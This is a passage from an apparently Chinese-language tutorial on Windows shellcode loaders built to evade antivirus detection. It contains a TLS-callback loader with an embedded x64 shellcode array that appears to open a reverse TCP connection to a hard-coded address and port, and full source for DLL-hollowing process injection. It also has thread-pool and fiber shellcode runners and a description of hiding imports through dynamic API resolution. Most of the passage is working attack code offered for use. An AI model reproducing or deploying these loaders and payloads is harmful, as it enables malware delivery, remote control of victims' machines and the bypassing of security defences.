class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存放shellcode的数组</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//TLS回调函数</span></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TlsCallBack</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;	</span><br><span class="line">		HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">		((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//确保链接器在生成可执行文件时包含TLS相关的符号,即确保链接器知道程序使用了TLS功能和自定义的TLS回调函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码告诉编译器，接下来的数据（如变量定义）将放置在名为.CRT$XLB的数据段中。</span></span><br><span class="line"><span class="comment">//.CRT$XLB是一个特殊的数据段名称，链接器将在其中寻找TLS回调函数的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码定义了一个名为_tls_callback的变量，其类型为PIMAGE_TLS_CALLBACK（一个指向TLS回调函数的指针）。</span></span><br><span class="line"><span class="comment">//此变量被初始化为指向TlsCallBack函数的地址</span></span><br><span class="line"><span class="comment">//由于我们在第一行代码中使用了#pragma data_seg指令，_tls_callback变量将被放置在.CRT$XLB数据段中</span></span><br><span class="line"><span class="comment">//.CRT$XLB是一个特定的数据段名称，与C运行时（C Runtime，CRT）机制有关。在这个名称中，各部分的含义如下：</span></span><br><span class="line"><span class="comment">//.CRT：这个前缀表示该数据段与C运行时机制相关。</span></span><br><span class="line"><span class="comment">//$：这个符号在数据段名称中用作分隔符。</span></span><br><span class="line"><span class="comment">//XL：这两个字符表示该数据段用于存储TLS回调函数地址。在链接器处理TLS回调时，它会查找具有这个前缀的数据段。</span></span><br><span class="line"><span class="comment">//B：这个字母表示数据段的顺序。这个字符可以是字母表中的B到Y之间的任意一个字母。这意味着可以定义多个TLS回调，链接器会按照字母顺序调用它们。</span></span><br><span class="line"><span class="comment">//需要注意的是，.CRT$XLA和.CRT$XLZ这两个数据段名称是保留的，用于C运行时库的内部实现，因此不应在用户代码中使用</span></span><br><span class="line"><span class="comment">//EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span></span><br><span class="line">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码告诉编译器恢复默认的数据段。</span></span><br><span class="line"><span class="comment">//这意味着在这个指令之后定义的数据（如变量定义）将被放置在默认的数据段中，而不是.CRT$XLB数据段</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg ()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tls回调函数执行完后才执行我!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="11-dll镂空注入"><a href="#11-dll镂空注入" class="headerlink" title="11.dll镂空注入"></a>11.dll镂空注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>模块镂空（DLL Hollowing）是一种Shellcode注入技术，它借鉴了进程镂空（Process Hollowing）的原理和思路。通过利用合法模块信息来伪装恶意代码，使得检测变得困难。虽然可以通过远程DLL注入的方式将整个恶意DLL注入目标系统，但这种方法较易被检测。例如，攻击者需要将恶意DLL上传到受害者主机，而杀毒软件可以通过监控Windows&#x2F;Temp&#x2F;等目录来拦截远程DLL注入。</p>
<p>相比之下，模块镂空不具备这样的风险，因为它是在带有微软签名的DLL中镂空一个区域。为了避免进程出错，不能直接在进程空间中已存在的DLL上进行镂空。取而代之的方法是先向目标进程远程注入一个合法的系统DLL，然后再镂空它。这样一来，我们就获得了一个与Windows模块相关联的Shellcode执行环境，既能规避安全检测，又能实现恶意代码执行</p>
<h2 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h2><ol>
<li><strong>确定要注入的目标进程：</strong>根据进程ID打开目标进程，获取其句柄（示例代码中的进程ID固定为2924，实际应用中可能需要根据需求进行调整）。</li>
<li><strong>将合法的DLL（如amsi.dll）注入目标进程：</strong>通过<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>将DLL名称写入远程进程的内存空间。然后，获取<code>LoadLibraryW</code>函数的地址，并在远程进程中创建一个新线程以调用该函数，实现DLL的加载。</li>
<li><strong>确定注入的DLL在目标进程中的基址：</strong>使用<code>EnumProcessModules</code>函数遍历目标进程中加载的所有模块，找到已注入的合法DLL（如amsi.dll）的基址。</li>
<li><strong>获取DLL的入口点：</strong>读取注入的DLL的PE头部信息，包括DOS头部和NT头部，从中获取DLL的入口点（AddressOfEntryPoint），并计算在目标进程中的实际地址。</li>
<li><strong>向DLL的入口点写入Shellcode：</strong>使用<code>WriteProcessMemory</code>将Shellcode写入目标进程的DLL入口点。</li>
<li><strong>执行Shellcode：</strong>在目标进程中创建一个新线程，以DLL的入口点作为线程的起始地址，从而在镂空的DLL内部执行Shellcode</li>
</ol>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将你的Shellcode放在这里</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR ModuleName[] = <span class="string">L&quot;C:\\windows\\system32\\amsi.dll&quot;</span>; <span class="comment">//定义要注入的合法DLL的文件路径</span></span><br><span class="line">    HMODULE hModules[<span class="number">256</span>] = &#123;&#125;;  <span class="comment">//定义一个数组用于存储目标进程中加载的模块的句柄</span></span><br><span class="line">    SIZE_T hModulesSize = <span class="built_in">sizeof</span>(hModules); <span class="comment">//计算存储模块句柄数组的大小</span></span><br><span class="line">    DWORD hModulesSizeNeeded = <span class="number">0</span>;  <span class="comment">//用于存储EnumProcessModules函数返回的实际需要的缓冲区大小</span></span><br><span class="line"></span><br><span class="line">    DWORD moduleNameSize = <span class="number">0</span>;  <span class="comment">//定义变量用于存储模块名称的大小（未使用）</span></span><br><span class="line">    SIZE_T hModulesCount = <span class="number">0</span>;  <span class="comment">//计算目标进程中模块的数量</span></span><br><span class="line">    CHAR rModuleName[<span class="number">128</span>] = &#123;&#125;;  <span class="comment">//定义一个字符数组用于存储远程模块的名称</span></span><br><span class="line">    HMODULE rModule = <span class="literal">NULL</span>;  <span class="comment">//定义一个变量用于存储找到的远程模块的句柄</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 以可读写权限打开目标进程</span></span><br><span class="line">    <span class="comment">//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">31652</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在远程进程中分配内存并写入待注入DLL的路径</span></span><br><span class="line">    LPVOID lprBuffer = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> ModuleName, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lprBuffer, (LPVOID)ModuleName, <span class="keyword">sizeof</span> ModuleName, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取LoadLibraryW函数的地址，用于在远程进程中加载DLL</span></span><br><span class="line">    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建远程线程以加载DLL</span></span><br><span class="line">    HANDLE dllThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, threadRoutine, lprBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待远程线程加载完DLL</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(dllThread, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到在远程进程中注入的DLL的基地址</span></span><br><span class="line">    <span class="built_in">EnumProcessModules</span>(hProcess, hModules, hModulesSize, &amp;hModulesSizeNeeded);</span><br><span class="line">    hModulesCount = hModulesSizeNeeded / <span class="built_in">sizeof</span>(HMODULE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hModulesCount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rModule = hModules[i];</span><br><span class="line">        <span class="built_in">GetModuleBaseNameA</span>(hProcess, rModule, rModuleName, <span class="built_in">sizeof</span>(rModuleName));</span><br><span class="line">        <span class="keyword">if</span> (std::<span class="built_in">string</span>(rModuleName).<span class="built_in">compare</span>(<span class="string">&quot;amsi.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DLL的AddressOfEntryPoint</span></span><br><span class="line">    DWORD headerBufferSize = <span class="number">0x1000</span>;</span><br><span class="line">    LPVOID peHeader = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, headerBufferSize);</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(hProcess, rModule, peHeader, headerBufferSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader + dosHeader-&gt;e_lfanew);</span><br><span class="line">    LPVOID dllEntryPoint = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)rModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Shellcode写入DLL的AddressOfEntryPoint</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, dllEntryPoint, (LPCVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从注入的DLL中执行Shellcode</span></span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (PTHREAD_START_ROUTINE)dllEntryPoint, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="12-线程池等待"><a href="#12-线程池等待" class="headerlink" title="12.线程池等待"></a>12.线程池等待</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;填写shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ThreadPoolLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个DWORD变量，用于存储原始内存保护属性</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个事件对象，初始状态为有信号状态，使用默认安全属性，非手动重置，无名称</span></span><br><span class="line">    HANDLE event = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    CreateThreadpoolWait用于创建一个线程池等待对象的函数,</span></span><br><span class="line"><span class="comment">    程池等待对象允许您在等待内核对象（如事件、信号量等）变为有信号状态时执行特定的回调函数</span></span><br><span class="line"><span class="comment">    其语法格式如下:</span></span><br><span class="line"><span class="comment">    PTP_WAIT CreateThreadpoolWait(</span></span><br><span class="line"><span class="comment">      PTP_WAIT_CALLBACK pfnwa,  //指向回调函数的指针</span></span><br><span class="line"><span class="comment">      PVOID              pv,   //传递给回调函数的参数</span></span><br><span class="line"><span class="comment">      PTP_CALLBACK_ENVIRON pcbe  //指向线程池回调环境的指针,置NULL则表示使用默认的环境</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 创建一个线程池等待对象，关联到shellcode作为回调函数，回调函数参数和线程池环境为NULL</span></span><br><span class="line">    PTP_WAIT threadPoolWait = <span class="built_in">CreateThreadpoolWait</span>((PTP_WAIT_CALLBACK)(LPVOID)shellcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    SetThreadpoolWait函数用于线程池中添加等待对象的函数。</span></span><br><span class="line"><span class="comment">    当等待的内核对象（如事件、信号量等）变为有信号状态时，线程池会调用与等待对象关联的回调函数</span></span><br><span class="line"><span class="comment">    其语法格式如下:</span></span><br><span class="line"><span class="comment">    VOID SetThreadpoolWait(</span></span><br><span class="line"><span class="comment">      PTP_WAIT pwa,  //指向要添加到线程池的等待对象的指针</span></span><br><span class="line"><span class="comment">      HANDLE   hObject,  //要等待的内核对象的句柄,当这个内核对象变为有信号状态时,线程池会调用与等待对象关联的回调函数</span></span><br><span class="line"><span class="comment">      PFILETIME pftTimeout  //指向一个FILETIME结构的指针，表示等待超时的时间</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 将等待对象添加到线程池中,当事件对象event触发（变为有信号状态）时，线程池会调用与threadPoolWait关联的回调函数</span></span><br><span class="line">    <span class="built_in">SetThreadpoolWait</span>(threadPoolWait, event, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待事件对象变为无信号状态（表示shellcode执行完毕），无限等待</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(event, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ThreadPoolLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="13-创建纤程加载"><a href="#13-创建纤程加载" class="headerlink" title="13.创建纤程加载"></a>13.创建纤程加载</h1><h2 id="什么是纤程"><a href="#什么是纤程" class="headerlink" title="什么是纤程"></a>什么是纤程</h2><p>纤程（Fiber）是一种轻量级的线程，也被称为协程（Coroutine）或微线程（Microthread）。它们是一种用户级别的线程，由程序自身管理，而不是由操作系统内核管理。纤程是一种可以提高程序执行效率的调度机制，特别适用于需要大量并发执行任务的场景</p>
<h2 id="实现代码-4"><a href="#实现代码-4" class="headerlink" title="实现代码"></a>实现代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将当前线程转换为纤程（轻量级线程）</span></span><br><span class="line">    <span class="built_in">ConvertThreadToFiber</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span></span><br><span class="line">    <span class="type">void</span>* shellcodeFiber = <span class="built_in">CreateFiber</span>(<span class="number">0</span>, (LPFIBER_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切换到新创建的纤程，开始执行shellcode</span></span><br><span class="line">    <span class="built_in">SwitchToFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode执行完毕后，删除纤程对象</span></span><br><span class="line">    <span class="built_in">DeleteFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="14-动态api函数加载"><a href="#14-动态api函数加载" class="headerlink" title="14.动态api函数加载"></a>14.动态api函数加载</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>传统的静态导入API函数会在可执行文件的导入表中明确列出所有用到的函数。这使得恶意代码容易被安全工具和分析人员发现，因为敏感API函数的使用通常表明了恶意行为。</p>
<p>而动态调用API函数，如本示例中的代码所展示的，可以在运行时动态解析并获取API函数的地址。这样，敏感函数不会出现在导入表中，从而使得恶意代码更难被发现。此外，动态调用API函数还可以结合其他技术（如代码混淆、加密等）来进一步提高恶意代码的隐蔽性</p>
<h2 id="实现思路-1"><a href="#实现思路-1" class="headerlink" title="实现思路"></a>实现思路</h2><ul>
<li>定位关键模块：首先找到包含核心API函数的关键模块（如kernel32.dll）。这通常可以通过解析PEB（Process Environment Block）中的模块列表来完成。</li>
<li>获取GetProcAddress：定位到kernel32.dll后，需要解析导出表（Export Table）以获取GetProcAddress函数的地址。GetProcAddress是一个核心函数，用于在运行时动态解析其他API函数的地址。</li>
<li>加载其他API：通过GetProcAddress函数，可以逐个获取其他需要的API函数的地址。例如，可以通过GetProcAddress获取VirtualProtect、CreateThread和WaitForSingleObject等函数的地址。</li>
<li>准备Shellcode：将Shellcode存储在缓冲区中，使用VirtualProtect函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行Shellcode。</li>
<li>创建线程并执行Shellcode：使用CreateThread函数创建一个新线程，并将Shellcode的地址作为线程的启动例程。线程创建后，使用WaitForSingleObject等待线程执行完成</li>
</ul>
